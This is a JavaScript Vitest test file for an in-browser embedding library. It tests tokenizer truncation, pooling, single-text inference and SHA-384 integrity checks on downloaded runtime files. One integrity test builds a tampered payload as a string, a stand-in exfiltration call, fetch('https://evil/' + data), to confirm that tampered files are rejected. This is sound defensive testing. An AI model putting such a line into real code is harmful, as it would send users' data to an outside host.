import { describe, it, expect, vi } from 'vitest';
import { createHash } from 'node:crypto';
import { closingTokenId, maxLength, truncateHF, encodeHF, poolNormalize, embedOne, sri384, fetchVerified, IntegrityError } from '../../src/lib/embedder-core.js';

// A word-level stand-in for a Transformers.js tokenizer: [CLS]=101 words... [SEP]=102, as a BERT post-processor emits.
function fakeTokenizer({ max = 8, cls = 101, sep = 102, eos, typeIds = true } = {}) {
  const calls = [];
  const tok = (text, opts) => {
    calls.push(opts);
    const ids = [cls, ...text.split(/\s+/).filter(Boolean).map((w) => 1000 + w.length), sep ?? eos];
    const enc = { input_ids: ids, attention_mask: ids.map(() => 1) };
    if (typeIds) enc.token_type_ids = ids.map(() => 0);
    return enc;
  };
  return Object.assign(tok, { model_max_length: max, sep_token_id: sep === null ? undefined : sep, eos_token_id: eos, calls });
}

describe('HF truncation convention', () => {
  it('keeps the first max-1 tokens and the closing special token', () => {
    const enc = { input_ids: [101, 1, 2, 3, 4, 5, 102], attention_mask: [1, 1, 1, 1, 1, 1, 1], token_type_ids: [0, 0, 0, 0, 0, 0, 0] };
    expect(truncateHF(enc, 5, 102)).toEqual({ input_ids: [101, 1, 2, 3, 102], attention_mask: [1, 1, 1, 1, 1], token_type_ids: [0, 0, 0, 0, 0] });
    expect(truncateHF(enc, 7, 102)).toBe(enc);                     // at the limit: unchanged
    expect(truncateHF(enc, null, 102)).toBe(enc);                  // no limit configured
  });
  it('plain cut when the encoding does not end with the closing token', () => {
    const enc = { input_ids: [1, 2, 3, 4, 5], attention_mask: [1, 1, 1, 1, 1] };
    expect(truncateHF(enc, 3, 102)).toEqual({ input_ids: [1, 2, 3], attention_mask: [1, 1, 1] });
    expect(truncateHF(enc, 3, null).input_ids).toEqual([1, 2, 3]);
  });
  it('derives the closing id and the limit from the tokenizer (sep, else eos; finite model_max_length)', () => {
    expect(closingTokenId({ sep_token_id: 102, eos_token_id: 7 })).toBe(102);
    expect(closingTokenId({ sep_token_id: undefined, eos_token_id: 2 })).toBe(2);
    expect(closingTokenId({})).toBeNull();
    expect(maxLength({ model_max_length: 256 })).toBe(256);
    expect(maxLength({ model_max_length: Infinity })).toBeNull();
    expect(maxLength({ model_max_length: 1e30 })).toBeNull();
  });
  it('encodeHF tokenizes untruncated, then applies the convention', () => {
    const tok = fakeTokenizer({ max: 5 });
    const enc = encodeHF(tok, 'a bb ccc dddd eeeee ffffff');
    expect(tok.calls[0]).toMatchObject({ truncation: false, padding: false, add_special_tokens: true, return_tensor: false });
    expect(enc.input_ids).toEqual([101, 1001, 1002, 1003, 102]);
    expect(encodeHF(tok, 'a bb').input_ids).toEqual([101, 1001, 1002, 102]);
    const xlmr = fakeTokenizer({ max: 4, cls: 0, sep: null, eos: 2, typeIds: false });
    expect(encodeHF(xlmr, 'a bb ccc dddd')).toEqual({ input_ids: [0, 1001, 1002, 2], attention_mask: [1, 1, 1, 1] });
  });
});

describe('pooling', () => {
  // T=3, H=2 hidden states
  const hs = new Float32Array([3, 4, 1, 0, 100, 100]);
  it('mean pools over the attention mask, then L2-normalizes', () => {
    const v = poolNormalize(hs, 3, 2, [1, 1, 0], 'mean');          // mean of (3,4),(1,0) = (2,2)
    expect(v[0]).toBeCloseTo(Math.SQRT1_2, 6); expect(v[1]).toBeCloseTo(Math.SQRT1_2, 6);
  });
  it('cls takes the first position', () => {
    const v = poolNormalize(hs, 3, 2, [1, 1, 1], 'cls');
    expect(Array.from(v).map((x) => +x.toFixed(6))).toEqual([0.6, 0.8]);
  });
  it('refuses any other pooling', () => { expect(() => poolNormalize(hs, 3, 2, [1, 1, 1], 'max')).toThrow('Unsupported pooling'); });
});

describe('embedOne', () => {
  class Tensor { constructor(type, data, dims) { Object.assign(this, { type, data, dims }); } }
  it('runs one text through the model with int64 inputs of the truncated encoding', async () => {
    const tok = fakeTokenizer({ max: 4 });
    const seen = [];
    const model = async (inputs) => {
      seen.push(inputs);
      const T = inputs.input_ids.dims[1], H = 3, data = new Float32Array(T * H);
      for (let t = 0; t < T; t++) data.set([1, t, 0], t * H);
      return { last_hidden_state: { data, dims: [1, T, H] } };
    };
    const r = await embedOne({ tokenizer: tok, model, Tensor }, 'a bb ccc dddd eeeee', 'mean');
    expect(r.ids).toEqual([101, 1001, 1002, 102]);
    expect(Object.keys(seen[0]).sort()).toEqual(['attention_mask', 'input_ids', 'token_type_ids']);
    expect(seen[0].input_ids).toMatchObject({ type: 'int64', dims: [1, 4] });
    expect(Array.from(seen[0].input_ids.data, Number)).toEqual([101, 1001, 1002, 102]);
    const n = Math.hypot(1, 1.5);                                   // mean over t=0..3 of (1, t, 0) = (1, 1.5, 0)
    expect(Array.from(r.vector).map((x) => +x.toFixed(6))).toEqual([+(1 / n).toFixed(6), +(1.5 / n).toFixed(6), 0]);
  });
});

describe('runtime integrity', () => {
  const bytes = new TextEncoder().encode('export default function factory() {}').buffer;
  const good = 'sha384-' + createHash('sha384').update(Buffer.from(bytes)).digest('base64');
  const URL1 = 'https://cdn.example/ort/ort-wasm-simd-threaded.asyncify.mjs';
  const resp = (b, status = 200) => ({ ok: status >= 200 && status < 300, status, arrayBuffer: async () => b.slice(0) });
  function cacheStorage() {
    const m = new Map(), opened = [];
    const cache = {
      match: async (u) => (m.has(u) ? { arrayBuffer: async () => m.get(u).slice(0) } : undefined),
      put: async (u, r) => { m.set(u, await r.arrayBuffer()); },
      delete: async (u) => m.delete(u),
    };
    return { m, opened, open: async (name) => { opened.push(name); return cache; } };
  }
  it('sri384 matches Node\'s SHA-384', async () => { expect(await sri384(bytes)).toBe(good); });
  it('match: returns the network bytes and caches them, so the next load needs no network', async () => {
    const cs = cacheStorage(), f = vi.fn(async () => resp(bytes));
    const b = await fetchVerified(URL1, good, { fetchImpl: f, cacheStorage: cs, cacheName: 'c' });
    expect(new Uint8Array(b)).toEqual(new Uint8Array(bytes));
    expect(cs.opened).toEqual(['c']);
    expect(cs.m.has(URL1)).toBe(true);
    const offline = vi.fn(async () => { throw new TypeError('offline'); });
    expect(new Uint8Array(await fetchVerified(URL1, good, { fetchImpl: offline, cacheStorage: cs, cacheName: 'c' }))).toEqual(new Uint8Array(bytes));
    expect(offline).not.toHaveBeenCalled();
  });
  it('mismatch: rejects with IntegrityError and caches nothing', async () => {
    const cs = cacheStorage(), tampered = new TextEncoder().encode('fetch("https://evil/" + data)').buffer;
    const err = await fetchVerified(URL1, good, { fetchImpl: async () => resp(tampered), cacheStorage: cs, cacheName: 'c' }).catch((e) => e);
    expect(err).toBeInstanceOf(IntegrityError);
    expect(err.message).toMatch(/Integrity check failed for runtime file ort-wasm-simd-threaded\.asyncify\.mjs/);
    expect(cs.m.size).toBe(0);
  });
  it('a poisoned cached copy is discarded and replaced by a verified download', async () => {
    const cs = cacheStorage(); cs.m.set(URL1, new TextEncoder().encode('poisoned').buffer);
    const f = vi.fn(async () => resp(bytes));
    const b = await fetchVerified(URL1, good, { fetchImpl: f, cacheStorage: cs, cacheName: 'c' });
    expect(f).toHaveBeenCalledTimes(1);
    expect(new Uint8Array(b)).toEqual(new Uint8Array(bytes));
    expect(await sri384(cs.m.get(URL1))).toBe(good);
  });
  it('refuses a file with no pinned hash without fetching it, and reports HTTP failures', async () => {
    const f = vi.fn(async () => resp(bytes));
    await expect(fetchVerified(URL1, undefined, { fetchImpl: f })).rejects.toBeInstanceOf(IntegrityError);
    expect(f).not.toHaveBeenCalled();
    await expect(fetchVerified(URL1, good, { fetchImpl: async () => resp(bytes, 404), cacheStorage: null })).rejects.toThrow('HTTP 404');
    await expect(fetchVerified(URL1, good, { fetchImpl: async () => { throw new TypeError('x'); }, cacheStorage: null })).rejects.toThrow('Could not download runtime file');
  });
});
